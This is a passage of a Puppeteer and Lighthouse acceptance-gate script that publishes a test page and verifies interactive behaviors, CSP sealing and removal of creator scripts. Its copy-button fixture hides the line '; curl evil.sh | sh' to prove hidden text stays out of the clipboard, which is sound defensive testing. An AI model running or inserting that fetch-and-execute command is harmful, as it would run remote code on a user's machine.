// scripts/qa/behaviors-born100-gate.mjs
//
// Born-100 acceptance gate for OpenLen "Conductas" (Task 14, the Phase-2
// gate). Publishes a real page carrying EVERY registered behavior through
// the REAL publish pipeline (sanitize -> bakeBehaviors -> CSP seal), serves
// the exact index.html that lands on disk over plain http, then asserts:
//
//   - ZERO Content-Security-Policy violations in a real browser console
//     (the titular assertion — see the header note below on why this is
//     the only test in the whole project that can catch a CSP hash drift)
//   - every registered behavior works end-to-end (countdown/filter/lightbox/
//     copy/autoplay/theme/sticky/tabs/calc) as observed via Puppeteer, not
//     jsdom. BEHAVIOR_GATE_ASSERTIONS below makes that list self-enforcing:
//     register a recipe without an assertion here and the gate fails loudly.
//   - the creator's own <script> and onclick= do NOT survive the sanitizer
//   - Lighthouse mobile-throttled: performance >=99, a11y/best-practices/
//     seo = 100 (Born-100), same thresholds as scripts/qa/3d-born100-gate.mjs
//
// Why this exists (do not weaken it): bakeBehaviors runs AFTER the
// sanitizer and the CSP seal (crates/html-engine/src/publish/seal.rs)
// hashes each inline <script> it finds in the SERIALIZED output. If that
// hash ever drifts from the byte-identical script the browser actually
// receives, Chrome silently refuses to run the script — every behavior dies
// in production while every jsdom unit test in lib/conductas-heredadas/ stays green,
// because jsdom never enforces CSP. Only a real browser hitting a real
// served artifact can catch that. See lib/conductas-heredadas/registry.ts, build.ts,
// and lib/publish/behaviors-sanitize-order.test.ts for the pipeline this
// gate is the browser-truth capstone of.
//
// Lighthouse v13 API note (same as the 3D gate): the flat-flags form
// lighthouse(url, { port, formFactor, throttling, ... }) is correct for
// v13.3.0. See scripts/run-lighthouse.mjs for the established pattern.
//
// tsx note: run via `tsx scripts/qa/behaviors-born100-gate.mjs` (not
// `node --import tsx/esm`) — node v24 removed the deprecated loader
// registration path this repo used to rely on.
//
// Chrome note: if Chrome cannot launch, this gate exits 1. There is no
// meaningful "static-only" pass here (unlike the 3D gate) — the whole
// point of Task 14 is browser truth, so an absent Chrome is never a soft
// pass. On Windows, Puppeteer's bundled Chromium is normally found
// automatically; set PUPPETEER_EXECUTABLE_PATH to override.
//
// prefers-reduced-motion: Chrome's default emulated media feature can come
// up as "reduce" in some headless configs. autoplay's runtime intentionally
// refuses to start under reduced-motion (WCAG 2.2.2) — so this gate
// explicitly emulates "no-preference" before navigating, or the autoplay
// assertion would fail for the CORRECT reason and mislead whoever reads it.
//
// PUBLISH_ROOT: lib/publish/filesystem.ts's getRoot() reads this env var
// (falls back to /var/www/openlen) specifically so tests can publish to a
// tmp dir. Set it BEFORE calling publishToDir. Network-touching bakes
// (image/font) are turned off the same way lib/publish/multi-page-publish
// .test.ts does it — orthogonal to behaviors, pure hermeticity, the seal
// and bakeBehaviors themselves stay fully on.

import { mkdtempSync, writeFileSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createServer } from "node:http";
import { BEHAVIORS, BEHAVIOR_ORDER } from "../../lib/conductas-heredadas/registry.ts";
import { BEHAVIORS_SCRIPT_BUDGET_BYTES } from "../../lib/conductas-heredadas/build.ts";

// ── Catalog-coverage self-check — runs BEFORE Chrome/publish/network ───────
// MARKERS (used further down by the static substring checks) is DERIVED from
// the registry, not hand-copied, so a new recipe's marker is automatically
// picked up. That is NOT enough on its own: this gate's actual reason to
// exist is the hand-written Puppeteer interactions below (real clicks /
// scrolls / computed-style reads through the real seal) — a marker merely
// showing up in a substring check proves nothing about whether the recipe
// works. Those interactions can't be generated generically (a generic "does
// the marker's element exist" loop would not have caught a single one of the
// regressions logged in lib/conductas-heredadas/conformance.test.ts's "aislamiento
// entre recetas" comment), so they stay hand-written, one safeAssert per
// behavior — which means nothing FORCES a new one to get written when
// the next behavior is registered. BEHAVIOR_GATE_ASSERTIONS is that missing force:
// the manually-maintained ledger of which behavior has a numbered safeAssert
// below (see the numbered safeAssert/record calls further down). If the
// registry grows and this ledger doesn't move with it, the gate fails here,
// loudly, before touching Chrome — never silently green.
const BEHAVIOR_GATE_ASSERTIONS = {
  countdown: 2,
  filter: 3,
  lightbox: 4,
  copy: 5,
  autoplay: 6,
  theme: 7,
  sticky: 8,
  tabs: 10,
  calc: 11,
};
const MARKERS = BEHAVIOR_ORDER.map((name) => BEHAVIORS[name].marker);
{
  const registered = [...BEHAVIOR_ORDER].sort();
  const asserted = Object.keys(BEHAVIOR_GATE_ASSERTIONS).sort();
  const uncovered = registered.filter((n) => !asserted.includes(n));
  const stale = asserted.filter((n) => !registered.includes(n));
  if (uncovered.length || stale.length) {
    const lines = ["GATE FAILED — el catalogo de conductas crecio pero este gate no lo siguio:"];
    for (const name of uncovered) {
      lines.push(
        `  - se anadio "${name}" al registro (lib/conductas-heredadas/registry.ts / BEHAVIOR_ORDER) pero nadie escribio ` +
          `su asercion de navegador en scripts/qa/behaviors-born100-gate.mjs. Que hacer: (1) agrega el marcador ` +
          `de ejemplo de "${name}" a buildPage() en este archivo, (2) escribe un safeAssert(...) que la ejercite ` +
          `con Puppeteer real (click / scroll / leer estilo computado — nunca jsdom), (3) registra su numero de ` +
          `asercion en BEHAVIOR_GATE_ASSERTIONS arriba.`,
      );
    }
    for (const name of stale) {
      lines.push(
        `  - BEHAVIOR_GATE_ASSERTIONS tiene una entrada para "${name}" que ya no existe en BEHAVIOR_ORDER — ` +
          `borrala (la conducta fue removida del registro).`,
      );
    }
    console.error("\n" + lines.join("\n"));
    process.exit(1);
  }
}

const lighthouse = (await import("lighthouse")).default;
const puppeteer = (await import("puppeteer")).default;

const SUB = "behaviors-gate";

// A hand-written photo asset served from OUR OWN local static server at a
// path independent of the release dir. `http://127.0.0.1:<port>/...` is not
// on bakeResponsiveImages' remote-host allowlist (lib/publish/image-bake.ts
// classifySource: images.unsplash.com / images.openlen.com / uploads. /
// templates. / R2 public bases only), so the real publish pipeline leaves
// this <img> byte-untouched — no network fetch races publish. The lightbox
// recipe's own runtime requires href to match /^https?:\/\//i (see
// lib/conductas-heredadas/recipes/lightbox.ts), so it can't be a data: URI — a data:
// href would make the browser navigate away on click instead of opening the
// modal, which is a different, wrong test.
const PHOTO_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 220" width="320" height="220" role="img" aria-label="Tacos al pastor"><rect width="320" height="220" fill="#f97316"/><circle cx="160" cy="88" r="52" fill="#fde68a"/><text x="160" y="176" font-size="20" text-anchor="middle" font-family="sans-serif" font-weight="700" fill="#1f2937">Tacos al pastor</text></svg>`;

// The gate page. Every markup fragment below is copied from each recipe's
// `doc.example` in lib/conductas-heredadas/recipes/*.ts (source of truth per the
// task) — not invented. Real vertical scroll (>24px needed for sticky) via
// the 1400px spacer; a real horizontal-overflow carousel for autoplay to
// scroll; a creator <script> + onclick= to prove the sanitizer eats them.
// No Tailwind CDN / no Google Fonts link — zero external network
// dependency so the Lighthouse run is fast and hermetic (matches the 3D
// gate's PAGE, which is also plain inline styles).
function buildPage(origin) {
  const countdownIso = new Date(Date.now() + 3600_000).toISOString();
  const photoUrl = `${origin}/gate-assets/photo.svg`;
  return `<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="Pagina de aceptacion Born-100 para las conductas de OpenLen.">
<link rel="icon" href="data:,">
<title>Gate de conductas — Born-100</title>
<style>
  :root{color-scheme:light dark}
  *{box-sizing:border-box}
  body{margin:0;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:#fff;color:#111827;line-height:1.5}
  html.dark body{background:#0b0d12;color:#f3f4f6}
  nav[data-ol-sticky]{position:fixed;top:0;left:0;right:0;display:flex;gap:20px;flex-wrap:wrap;align-items:center;padding:16px 24px;background:transparent;transition:background-color .2s,box-shadow .2s;z-index:50}
  nav[data-ol-sticky] a{color:inherit;text-decoration:none;font-weight:600}
  nav[data-ol-sticky][data-ol-stuck]{background:#ffffff;box-shadow:0 1px 0 rgba(0,0,0,.08)}
  html.dark nav[data-ol-sticky][data-ol-stuck]{background:#0b0d12;box-shadow:0 1px 0 rgba(255,255,255,.12)}
  main{padding-top:96px}
  section{max-width:880px;margin:0 auto;padding:48px 24px}
  h1{font-size:2.1rem;font-weight:800;margin:0 0 12px}
  h2{font-size:1.4rem;font-weight:700;margin:0 0 20px}
  p{margin:0 0 8px}
  .spacer{height:1400px}
  button{font:inherit;cursor:pointer}
  [data-ol-filter-group]{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
  [data-ol-filter-group] button{padding:8px 16px;border-radius:999px;border:1.5px solid #111827;background:#fff;color:#111827}
  [data-ol-filter-group] button[aria-pressed="true"]{background:#111827;color:#fff}
  [data-ol-filter-target]{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:16px}
  [data-ol-filter-target] article{border:1px solid #d1d5db;border-radius:12px;padding:16px;color:#111827}
  [data-ol-calc]{display:grid;gap:12px;max-width:420px}
  [data-ol-calc] input{font:inherit;padding:8px 12px;border:1.5px solid #d1d5db;border-radius:8px}
  [data-ol-calc] [data-ol-out]{font-weight:800}
  [data-ol-countdown]{display:flex;gap:20px;flex-wrap:wrap;font-variant-numeric:tabular-nums}
  [data-ol-countdown] div{text-align:center}
  [data-ol-countdown] span{display:block;font-size:1.8rem;font-weight:800}
  [data-ol-lightbox]{display:inline-block}
  [data-ol-lightbox] img{border-radius:12px;display:block;max-width:280px;width:100%;height:auto}
  code{background:#f3f4f6;color:#111827;padding:4px 10px;border-radius:8px;font-size:1rem}
  html.dark code{background:#1f2937;color:#f3f4f6}
  [data-ol-row]{position:relative;padding:0 38px}
  [data-ol-scroller]{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:8px}
  [data-ol-scroller] article{flex:0 0 240px;scroll-snap-align:start;border:1px solid #d1d5db;border-radius:12px;padding:20px;background:#fff;color:#111827}
  html.dark [data-ol-scroller] article{background:#111827;color:#f3f4f6;border-color:#374151}
  [data-ol-scroll]{position:absolute;top:50%;transform:translateY(-50%);width:32px;height:32px;border-radius:999px;border:1px solid #d1d5db;background:#fff;color:#111827}
  [data-ol-scroll="prev"]{left:0}
  [data-ol-scroll="next"]{right:0}
  [data-ol-theme]{padding:8px 16px;border-radius:999px;border:1.5px solid #111827;background:#fff;color:#111827}
  html.dark [data-ol-theme]{border-color:#f3f4f6;background:#0b0d12;color:#f3f4f6}
  .tablist{display:flex;gap:8px;margin-bottom:12px}
  .tablist button{padding:8px 16px;border-radius:8px;border:1.5px solid #111827;background:#fff;color:#111827}
  .tablist button[aria-selected="true"]{background:#111827;color:#fff}
  [data-ol-tab-panels] pre{background:#f3f4f6;color:#111827;padding:16px;border-radius:8px;margin:0}
  footer{padding:32px 24px;text-align:center;color:#374151;font-size:.875rem}
  #creator-onclick-btn{padding:8px 16px;border-radius:8px;border:1.5px solid #111827;background:#fff;color:#111827;margin-top:12px}
</style>
</head>
<body>
<nav data-ol-sticky>
  <a href="#top">Gate de conductas</a>
  <a href="#filtro">Menu</a>
  <a href="#reloj">Oferta</a>
  <button data-ol-theme aria-label="Cambiar entre modo claro y oscuro">Tema</button>
</nav>
<main>
  <section id="top">
    <h1>Gate Born-100 de Conductas</h1>
    <p>Pagina de aceptacion con las 7 recetas horneadas por el pipeline real de publicacion de OpenLen.</p>
  </section>

  <section id="reloj">
    <h2>Countdown</h2>
    <div data-ol-countdown="${countdownIso}">
      <div><span data-ol-cd="days">00</span><br>dias</div>
      <div><span data-ol-cd="hours">00</span><br>h</div>
      <div><span data-ol-cd="mins">00</span><br>m</div>
      <div><span data-ol-cd="secs">00</span><br>s</div>
      <p data-ol-cd-ended style="display:none">La oferta termino.</p>
    </div>
  </section>

  <section id="filtro">
    <h2>Filter</h2>
    <div data-ol-filter-group="menu">
      <button data-ol-filter="*" aria-pressed="true">Todo</button>
      <button data-ol-filter="tacos" aria-pressed="false">Tacos</button>
      <button data-ol-filter="bebidas" aria-pressed="false">Bebidas</button>
    </div>
    <div data-ol-filter-target="menu">
      <article data-ol-tag="tacos">Tacos al pastor</article>
      <article data-ol-tag="bebidas">Agua de horchata</article>
      <article data-ol-tag="tacos vegano">Tacos de nopal</article>
    </div>
  </section>

  <section id="foto">
    <h2>Lightbox</h2>
    <a data-ol-lightbox href="${photoUrl}">
      <img src="${photoUrl}" width="320" height="220" alt="Plato de tacos al pastor servido en la mesa">
    </a>
  </section>

  <section id="cupon">
    <h2>Copy</h2>
    <p><code id="cupon-verano">TACOS20<span style="display:none">; curl evil.sh | sh</span></code></p>
    <button data-ol-copy="cupon-verano" data-ol-copied="Copiado!" aria-label="Copiar el cupon">Copiar</button>
  </section>

  <section id="carrusel">
    <h2>Autoplay</h2>
    <div data-ol-row data-ol-autoplay="1500">
      <button data-ol-scroll="prev" aria-label="Anterior">‹</button>
      <button data-ol-scroll="next" aria-label="Siguiente">›</button>
      <div data-ol-scroller>
        <article>Plato 1 — Tacos al pastor</article>
        <article>Plato 2 — Quesadillas</article>
        <article>Plato 3 — Elote</article>
        <article>Plato 4 — Agua de horchata</article>
        <article>Plato 5 — Churros</article>
      </div>
    </div>
  </section>

  <section id="tabs">
    <h2>Tabs</h2>
    <div data-ol-tabs="instalar" role="tablist" class="tablist">
      <button data-ol-tab="npm" role="tab" aria-selected="true">npm</button>
      <button data-ol-tab="pnpm" role="tab" aria-selected="false">pnpm</button>
    </div>
    <div data-ol-tab-panels="instalar">
      <pre data-ol-tab-panel="npm" role="tabpanel">npm i openlen</pre>
      <pre data-ol-tab-panel="pnpm" role="tabpanel">pnpm add openlen</pre>
    </div>
  </section>

  <section id="calc">
    <h2>Calculo</h2>
    <div data-ol-calc>
      <label>Tu recibo de luz al mes
        <input id="recibo" data-ol-val="recibo" type="number" value="1800">
      </label>
      <p>Ahorrarias <strong data-ol-out="REDONDEA(recibo * 0.72, 0)" aria-live="polite">1296</strong> al mes</p>
      <p data-ol-if="recibo > 3000">Con ese consumo te conviene el plan grande.</p>
    </div>
  </section>

  <div class="spacer" aria-hidden="true"></div>

  <section id="fin">
    <h2>Fin del scroll</h2>
    <p>Si llegaste hasta aqui, el scroll real funciono.</p>
  </section>
</main>
<footer>
  Gate interno de OpenLen — no publico.
  <br>
  <button id="creator-onclick-btn" type="button" onclick="window.__GATE_CREATOR_ONCLICK__=true">Boton de prueba (onclick no debe sobrevivir)</button>
</footer>
<script>window.__GATE_CREATOR_SCRIPT__ = true;</script>
</body>
</html>`;
}

function contentTypeFor(filePath) {
  const ext = filePath.split(".").pop()?.toLowerCase() ?? "";
  return (
    {
      html: "text/html; charset=utf-8",
      xml: "application/xml",
      txt: "text/plain; charset=utf-8",
      svg: "image/svg+xml",
      js: "text/javascript",
      ico: "image/x-icon",
    }[ext] ?? "application/octet-stream"
  );
}

const results = [];
function record(n, name, pass, detail) {
  results.push({ n, name, pass, detail });
  console.log(`  [${pass ? "PASS" : "FAIL"}] ${n}. ${name}${detail ? " — " + detail : ""}`);
}
async function safeAssert(n, name, fn) {
  try {
    const { pass, detail } = await fn();
    record(n, name, pass, detail);
  } catch (err) {
    record(n, name, false, `threw: ${err?.message ?? err}`);
  }
}
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// ── Serve a real published artifact ─────────────────────────────────────
// gate-assets is independent of the release dir (ready before publish
// even starts); the release dir is filled in once publishToDir returns.
const assetsDir = mkdtempSync(join(tmpdir(), "olbeh-assets-"));
writeFileSync(join(assetsDir, "photo.svg"), PHOTO_SVG, "utf8");

let releaseDir = null;
const server = createServer((req, res) => {
  const rawUrl = (req.url || "/").split("?")[0];
  if (rawUrl.startsWith("/gate-assets/")) {
    try {
      const body = readFileSync(join(assetsDir, rawUrl.slice("/gate-assets/".length)));
      res.writeHead(200, { "content-type": contentTypeFor(rawUrl) });
      res.end(body);
    } catch {
      res.writeHead(404);
      res.end();
    }
    return;
  }
  if (!releaseDir) {
    res.writeHead(503);
    res.end();
    return;
  }
  const filePath = rawUrl === "/" ? "/index.html" : rawUrl;
  try {
    const body = readFileSync(join(releaseDir, filePath));
    res.writeHead(200, { "content-type": contentTypeFor(filePath) });
    res.end(body);
  } catch {
    res.writeHead(404);
    res.end();
  }
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const port = server.address().port;
const origin = `http://127.0.0.1:${port}`;

// Real publish: PUBLISH_ROOT redirects publishToDir off /var/www/openlen
// (lib/publish/filesystem.ts:93). Image/font bakes disabled the same way
// lib/publish/multi-page-publish.test.ts does — orthogonal to behaviors,
// pure hermeticity (our <img> host isn't on the image-bake allowlist
// anyway, so this changes nothing for this page). Sanitize -> bakeBehaviors
// -> CSP seal stay fully on: that seam is what this whole gate exists to
// exercise for real.
const publishRoot = mkdtempSync(join(tmpdir(), "olbeh-publish-"));
process.env.PUBLISH_ROOT = publishRoot;
process.env.OPENLEN_IMAGE_BAKE = "0";
process.env.OPENLEN_FONT_BAKE = "0";

const { publishToDir } = await import("../../lib/publish/filesystem.ts");
// La compilacion de los calculos ocurre en la INGESTION (preparePage ->
// beforeMeta), no al publicar: para cuando publishToDir corre, el programa ya
// viaja en el atributo. Reproducirlo aqui es lo fiel — asi este gate ejercita
// la costura COMPLETA (ingestion -> publish -> sello CSP -> navegador real) en
// vez de una pagina que nadie ingirio.
const { compileCalcRegions } = await import("../../lib/expr/document.ts");
const compiled = compileCalcRegions(buildPage(origin));
if (compiled.issues.length > 0) {
  const lines = ["GATE FAILED — la region de calculo de buildPage() no compila:"];
  for (const i of compiled.issues) lines.push(`  - ${i.attr}="${i.formula}": ${i.message}`);
  console.error("\n" + lines.join("\n"));
  process.exit(1);
}
const publishResult = await publishToDir({ subdomain: SUB, html: compiled.html });
releaseDir = join(publishRoot, SUB, "releases", publishResult.sha);

console.log(`Published ${SUB} -> ${releaseDir} (sha ${publishResult.sha})`);

// ── Static assertions (no Chrome needed) ────────────────────────────────
const servedHtml = readFileSync(join(releaseDir, "index.html"), "utf8");
const staticFail = [];

for (const m of MARKERS) {
  if (!servedHtml.includes(m)) staticFail.push(`marker ${m} missing from the served HTML`);
}
if (!servedHtml.includes("data-ol-behaviors")) {
  staticFail.push("data-ol-behaviors runtime <script> missing — bakeBehaviors did not fire");
}
// This is the precondition the whole gate depends on: if the seal silently
// failed (crates/html-engine/src/publish/seal.rs's self-check degrades to
// unsealed output on any hash drift), the served page would have NO CSP at
// all, and the "zero CSP violations" browser assertion below would pass
// VACUOUSLY — nothing left to violate. Fail loudly here instead.
if (!servedHtml.includes("data-ol-csp")) {
  staticFail.push(
    "CSP seal meta (data-ol-csp) missing from the served HTML — the seal either " +
      "didn't run or self-check failed and degraded to unsealed output. The " +
      "'zero CSP violations' browser assertion would be VACUOUS if this ships.",
  );
}
// calc: el valor de nacimiento (1800 * 0.72 = 1296) lo escribe la INGESTION
// dentro del elemento, y tiene que sobrevivir al publish y al sello — es lo
// unico que ve un visitante sin JS. Se comprueba sobre el HTML SERVIDO, no en
// el navegador: alli el runtime ya corrio, asi que leerlo con Puppeteer
// probaria el runtime otra vez y no la degradacion. Sin esto, una pagina con
// JS bloqueado enseñaria un hueco — o peor, un numero falso.
if (!/data-ol-out="[^"]*"[^>]*>1296</.test(servedHtml)) {
  staticFail.push(
    "calc: el valor de nacimiento (1296) no esta en el HTML servido — un visitante " +
      "sin JS no veria ningun resultado. La ingestion (compileCalcRegions) debe " +
      "escribirlo DENTRO del elemento y sobrevivir publish + sello.",
  );
}
if (!servedHtml.includes("data-ol-out-c=")) {
  staticFail.push("calc: el gemelo compilado (data-ol-out-c) no llego al HTML servido");
}
if (servedHtml.includes("__GATE_CREATOR_SCRIPT__")) {
  staticFail.push("creator <script>window.__GATE_CREATOR_SCRIPT__...</script> text survived sanitizeForPublish");
}
if (/id="creator-onclick-btn"[^>]*onclick=/i.test(servedHtml)) {
  staticFail.push("creator onclick= attribute survived sanitizeForPublish");
}

// The Rust seal re-parses + re-serializes the WHOLE document (kuchikiki)
// while computing/verifying the CSP hashes, which normalizes valueless
// attributes to `attr=""` (e.g. `data-ol-behaviors=""`, `data-ol-sticky=""`)
// — harmless (identical for hasAttribute/getAttribute/CSS selectors/substring
// checks), but it means the tag is NOT byte-identical to bakeBehaviors' own
// `<script data-ol-behaviors>` output. `(?!-)` excludes the sibling
// `data-ol-behaviors-head` tag (theme's pre-paint script, measured separately,
// against BEHAVIORS_SCRIPT_BUDGET_BYTES below).
const behaviorsScriptMatch = /<script\s+data-ol-behaviors(?!-)[^>]*>([\s\S]*?)<\/script>/.exec(servedHtml);
const behaviorsScriptBytes = behaviorsScriptMatch ? Buffer.byteLength(behaviorsScriptMatch[1], "utf8") : null;
if (behaviorsScriptBytes === null) {
  staticFail.push("could not locate the <script data-ol-behaviors> tag to measure its byte weight");
}

// Arreglo 6 (revisión final de rama): this used to only PRINT the weight —
// a number nobody asserts is not a gate. BEHAVIORS_SCRIPT_BUDGET_BYTES is
// imported from lib/conductas-heredadas/build.ts, the SAME constant
// lib/conductas-heredadas/conformance.test.ts asserts against in jsdom, so the ceiling
// can never diverge between the unit test and this end-to-end measurement
// on a REAL published artifact.
if (behaviorsScriptBytes !== null && behaviorsScriptBytes > BEHAVIORS_SCRIPT_BUDGET_BYTES) {
  staticFail.push(
    `behaviors script weight ${behaviorsScriptBytes}B exceeds the ${BEHAVIORS_SCRIPT_BUDGET_BYTES}B ceiling ` +
      `(BEHAVIORS_SCRIPT_BUDGET_BYTES, lib/conductas-heredadas/build.ts — same ceiling conformance.test.ts asserts in jsdom)`,
  );
}

console.log(`\nStatic checks: ${staticFail.length === 0 ? "PASSED" : "FAILED"}`);
for (const f of staticFail) console.log(`  - ${f}`);
console.log(
  `Behaviors script weight: ${behaviorsScriptBytes ?? "?"}B of ${BEHAVIORS_SCRIPT_BUDGET_BYTES}B ceiling` +
    (behaviorsScriptBytes !== null ? ` (margin ${BEHAVIORS_SCRIPT_BUDGET_BYTES - behaviorsScriptBytes}B)` : ""),
);

// ── Chrome: functional assertions (Puppeteer) + Lighthouse ─────────────
const LH_THRESHOLDS = { performance: 99, accessibility: 100, bestPractices: 100, seo: 100, lcpMs: 1600, tbtMs: 200 };
let lhResults = null;
const lhFail = [];

try {
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
    args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
  });

  // ── Functional assertions in a fresh incognito context ────────────────
  const cspViolations = [];
  const consoleLog = [];
  function wireConsole(page) {
    page.on("console", (msg) => {
      const text = msg.text();
      consoleLog.push(`[console:${msg.type()}] ${text}`);
      if (/content security policy/i.test(text)) cspViolations.push(text);
    });
    page.on("pageerror", (err) => {
      const text = String(err?.message ?? err);
      consoleLog.push(`[pageerror] ${text}`);
      if (/content security policy/i.test(text)) cspViolations.push(text);
    });
  }

  const ctx = await browser.createBrowserContext();
  await ctx.overridePermissions(origin, ["clipboard-read", "clipboard-write"]);
  const page = await ctx.newPage();
  wireConsole(page);
  // GOTCHA: if Chrome's default emulated media comes up "reduce", the
  // autoplay recipe correctly refuses to start (WCAG 2.2.2) — the
  // assertion needs "no-preference" to exercise the actually-running path.
  await page.emulateMediaFeatures([{ name: "prefers-reduced-motion", value: "no-preference" }]);
  await page.bringToFront();
  await page.goto(origin + "/", { waitUntil: "load" });

  console.log("\nFunctional assertions (real browser):");

  await safeAssert(9, "el JS del creador NO sobrevive (script + onclick)", async () => {
    const live = await page.evaluate(() => ({
      scriptRan: typeof window.__GATE_CREATOR_SCRIPT__ !== "undefined",
      onclickAttr: document.getElementById("creator-onclick-btn")?.getAttribute("onclick") ?? null,
    }));
    return {
      pass: !live.scriptRan && live.onclickAttr === null,
      detail: `scriptRan=${live.scriptRan} onclickAttr=${JSON.stringify(live.onclickAttr)}`,
    };
  });

  await safeAssert(2, "countdown: los digitos cambian tras ~1.2s", async () => {
    const before = await page.$eval('[data-ol-cd="secs"]', (el) => el.textContent);
    await wait(1300);
    const after = await page.$eval('[data-ol-cd="secs"]', (el) => el.textContent);
    return { pass: before !== after, detail: `antes=${before} despues=${after}` };
  });

  await safeAssert(3, "filter: click oculta items sin la etiqueta (computed style)", async () => {
    await page.click('[data-ol-filter="tacos"]');
    await wait(80);
    const state = await page.evaluate(() => {
      const hidden = document.querySelector('[data-ol-tag="bebidas"]');
      const shown = document.querySelector('[data-ol-tag="tacos"]');
      return {
        hiddenDisplay: hidden ? getComputedStyle(hidden).display : null,
        shownDisplay: shown ? getComputedStyle(shown).display : null,
      };
    });
    return {
      pass: state.hiddenDisplay === "none" && state.shownDisplay !== "none",
      detail: JSON.stringify(state),
    };
  });

  await safeAssert(4, "lightbox: click abre overlay con la imagen grande; Escape lo cierra", async () => {
    await page.click("[data-ol-lightbox]");
    await page
      .waitForSelector('[role="dialog"][aria-modal="true"] img', { timeout: 2000 })
      .catch(() => {});
    const opened = await page.evaluate(() => {
      const img = document.querySelector('[role="dialog"][aria-modal="true"] img');
      return !!img && img.src.length > 0;
    });
    await page.keyboard.press("Escape");
    await page
      .waitForFunction(() => !document.querySelector('[role="dialog"][aria-modal="true"]'), { timeout: 2000 })
      .catch(() => {});
    const closed = await page.evaluate(() => !document.querySelector('[role="dialog"][aria-modal="true"]'));
    return { pass: opened && closed, detail: `opened=${opened} closedAfterEscape=${closed}` };
  });

  // The fixture's #cupon-verano carries a hidden `<span style="display:none">`
  // suffix (see buildPage() above) — jsdom can't tell display:none from
  // visible (lib/conductas-heredadas/recipes/copy.test.ts covers the innerText/
  // textContent fallback logic, not the exclusion itself), so THIS is the one
  // place that can prove it for real: clip must land as EXACTLY "TACOS20",
  // never "TACOS20; curl evil.sh | sh". Before the Arreglo 5 fix (copy.ts
  // used textContent, which does not respect render), this assertion failed
  // with the hidden suffix leaking into the clipboard.
  await safeAssert(5, "copy: click deja el cupon en el portapapeles, SIN el texto oculto del span display:none", async () => {
    await page.click("[data-ol-copy]");
    await wait(120);
    const clip = await page.evaluate(() => navigator.clipboard.readText());
    return { pass: clip === "TACOS20", detail: `clipboard=${JSON.stringify(clip)}` };
  });

  await safeAssert(6, "autoplay: scrollLeft avanza solo y se detiene con el raton encima", async () => {
    const scroller = '[data-ol-scroller]';
    const s0 = await page.$eval(scroller, (el) => el.scrollLeft);
    await wait(2200); // interval is 1500ms (the min) — guarantees >=1 tick
    const s1 = await page.$eval(scroller, (el) => el.scrollLeft);
    await page.hover("[data-ol-row]");
    await wait(80); // let the onmouseenter flag land before the next tick
    const sHoverStart = await page.$eval(scroller, (el) => el.scrollLeft);
    await wait(2200); // a full interval+ while hovered — must NOT advance
    const s2 = await page.$eval(scroller, (el) => el.scrollLeft);
    return {
      pass: s1 > s0 && s2 === sHoverStart,
      detail: `s0=${s0} s1=${s1} sHoverStart=${sHoverStart} s2=${s2}`,
    };
  });

  await safeAssert(7, "theme: click agrega .dark a <html>; recargar conserva .dark", async () => {
    await page.click("[data-ol-theme]");
    await wait(80);
    const afterClick = await page.evaluate(() => document.documentElement.classList.contains("dark"));
    await page.reload({ waitUntil: "load" });
    const afterReload = await page.evaluate(() => document.documentElement.classList.contains("dark"));
    return { pass: afterClick && afterReload, detail: `afterClick=${afterClick} afterReload=${afterReload}` };
  });

  await safeAssert(8, "sticky: scroll hacia abajo -> data-ol-stuck; volver arriba -> lo pierde", async () => {
    await page.evaluate(() => window.scrollTo(0, 300));
    await page
      .waitForFunction(() => document.querySelector("[data-ol-sticky]")?.hasAttribute("data-ol-stuck"), {
        timeout: 2000,
      })
      .catch(() => {});
    const stuckDown = await page.evaluate(() => document.querySelector("[data-ol-sticky]")?.hasAttribute("data-ol-stuck"));
    await page.evaluate(() => window.scrollTo(0, 0));
    await page
      .waitForFunction(() => !document.querySelector("[data-ol-sticky]")?.hasAttribute("data-ol-stuck"), {
        timeout: 2000,
      })
      .catch(() => {});
    const stuckUp = await page.evaluate(() => document.querySelector("[data-ol-sticky]")?.hasAttribute("data-ol-stuck"));
    return { pass: stuckDown === true && stuckUp === false, detail: `down=${stuckDown} up=${stuckUp}` };
  });

  await safeAssert(10, "tabs: init muestra el 1er panel; click cambia de panel (computed style, sello real)", async () => {
    // Estilo COMPUTADO tras el sello CSP real — el ready-gate del css horneado
    // debe ocultar el panel inactivo y mostrar el activo, no solo togglear un
    // atributo que nada escucha.
    const disp = (sel) => page.$eval(sel, (el) => getComputedStyle(el).display);
    const npmInit = await disp('[data-ol-tab-panel="npm"]');
    const pnpmInit = await disp('[data-ol-tab-panel="pnpm"]');
    await page.click('[data-ol-tab="pnpm"]');
    await wait(80);
    const npmAfter = await disp('[data-ol-tab-panel="npm"]');
    const pnpmAfter = await disp('[data-ol-tab-panel="pnpm"]');
    const ariaAfter = await page.$eval('[data-ol-tab="pnpm"]', (el) => el.getAttribute("aria-selected"));
    return {
      pass:
        npmInit !== "none" && pnpmInit === "none" && // init: solo npm visible
        npmAfter === "none" && pnpmAfter !== "none" && // click: cambió a pnpm
        ariaAfter === "true",
      detail: `init(npm=${npmInit},pnpm=${pnpmInit}) click(npm=${npmAfter},pnpm=${pnpmAfter}) aria=${ariaAfter}`,
    };
  });

  await safeAssert(11, "calc: teclear recalcula el numero y revela el bloque condicional (sello real)", async () => {
    const out = () => page.$eval("[data-ol-out]", (el) => el.textContent.trim());
    const cond = () => page.$eval("[data-ol-if]", (el) => getComputedStyle(el).display);
    // OJO: aqui el runtime YA corrio, asi que esto NO es el valor de
    // nacimiento — ese se comprueba sobre el HTML servido, arriba, en las
    // static checks. Lo que se afirma aqui es que el runtime coincide con el:
    // los dos deben decir 1296 sobre el mismo documento.
    const born = await out();
    const condBorn = await cond();
    // Vaciar por CSSOM y luego teclear: un `click({clickCount:3})` sobre un
    // input[type=number] no selecciona su contenido de forma fiable en headless
